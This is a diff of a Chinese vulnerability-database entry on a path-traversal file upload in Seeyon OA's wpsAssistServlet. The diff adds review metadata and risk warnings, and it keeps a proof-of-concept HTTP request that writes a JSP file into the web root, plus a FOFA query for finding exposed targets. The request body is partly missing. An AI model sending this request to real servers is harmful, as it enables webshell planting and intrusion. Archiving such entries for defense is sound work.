@@ -1,11 +1,50 @@
 ---
-fofa: "查询语句"
 source: "MrWQ/vulnerability-paper"
+title: "致远OA wpsAssistServlet路径穿越上传"
+product: "致远OA"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "影响段只产品，FOFA限定V8.0SP2，不等于完整范围；ApacheJetspeed路径"
+prerequisites: "无cookie样本"
+side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
+review_date: "2026-10-02"
+source_url: "https://mp.weixin.qq.com/s/uWp4hULXtkpU4CwzAtZcxA"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9C%20OA%20wpsAssistServlet%20%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20%E9%99%84%20POC.md"
+fofa_unverified: "查询语句"
+id: "vw-94e6c5d02b4609f14a375630"
+entity_id: "ve-94e6c5d02b4609f14a375630"
+schema_version: "1"
 ---
 
-# 致远 OA wpsAssistServlet 接口存在任意文件上传漏洞 附 POC
+# 致远OA wpsAssistServlet路径穿越上传
 
-<meta name="referrer" content="no-referrer"/>
+## 条目说明
+
+- 对象与具体问题：致远OA；wpsAssistServlet路径穿越上传
+- 版本、配置及部署条件：影响段只产品，FOFA限定V8.0SP2，不等于完整范围；ApacheJetspeed路径
+- 认证与权限前提：无cookie样本
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 与wpsAssistServlet其他报告同realFileType链；multipart name/filename缺失
+- 01014.jsp与开头36011.jsp只是实例差异；修复仅泛称升级
+- 资料工具须关注获取不算正文附POC，实际请求已提供但损坏
+
+## 操作风险
+
+文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/uWp4hULXtkpU4CwzAtZcxA)
 
 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。
@@ -47,14 +86,13 @@ app="致远互联 - OA" && title="V8.0SP2"
 
 漏洞数据包：
 
-```
+```http
 POST /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/01014.jsp&fileId=2 HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
 Accept-Encoding: gzip, deflate
 Accept: */*
 Connection: close
-Content-Length: 217
 Content-Type: multipart/form-data; boundary=a4d7586ac9d50625dee11e86fa69bc71
 
 --a4d7586ac9d50625dee11e86fa69bc71
@@ -66,6 +104,8 @@ Content-Type: application/vnd.ms-excel
 
 
 ```
+
+> 请求长度说明：原资料 Content-Length 为 217；静态长度已移除，应由客户端根据最终请求体的字节数生成。
 
 ![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a2hL26GZCLbSEYq9LaJFE2pLA9rcbdBMU71iavkdSzGQfK70S8wdkiawenGDEg3juWYHpKMf1HzAaQ/640?wx_fmt=jpeg)
 
